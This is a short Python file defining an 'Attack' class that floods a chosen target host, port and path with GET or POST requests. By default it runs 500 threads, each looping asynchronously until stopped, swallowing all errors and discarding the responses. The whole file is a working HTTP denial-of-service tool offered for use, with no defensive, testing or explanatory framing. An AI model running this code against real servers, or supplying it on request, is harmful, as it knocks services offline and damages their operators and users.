import asyncio
import aiohttp
import threading

class Attack():
  url = 'http://{target}:{port}/{location}'
  
  def __init__(self, target, port, location='', threads=500, timeout=1, method='GET'): # add data, url, etc?
    self.target = target
    self.port = port
    self.location = location
    self.threads = threads
    self.timeout = timeout
    self.method = method
  
  async def get_attack(self):
    try:
      async with aiohttp.ClientSession() as session:
        while not self._stop:
          try:
            async with session.get(self.url.format(target=self.target, port=self.port, location=self.location), timeout=self.timeout) as response:
              await response.read()
          except:
            pass
    except:
      pass
  
  async def post_attack(self):
    try:
      async with aiohttp.ClientSession() as session:
        while not self._stop:
          try:
            async with session.post(self.url.format(target=self.target, port=self.port, location=self.location), timeout=self.timeout) as response:
              await response.read()
          except:
            pass
    except:
      pass
  
  def do_attack(self):
    if self.method == 'GET':
      asyncio.run(self.get_attack())
    elif self.method == 'POST':
      asyncio.run(self.post_attack())
  
  def start(self):
    self._stop = False
    self._threads = []
    
    for _ in range(self.threads):
      t = threading.Thread(target=self.do_attack)
      t.start()
      self._threads += [t]
  
  def stop(self):
    self._stop = True
    for t in self._threads:
      t.join()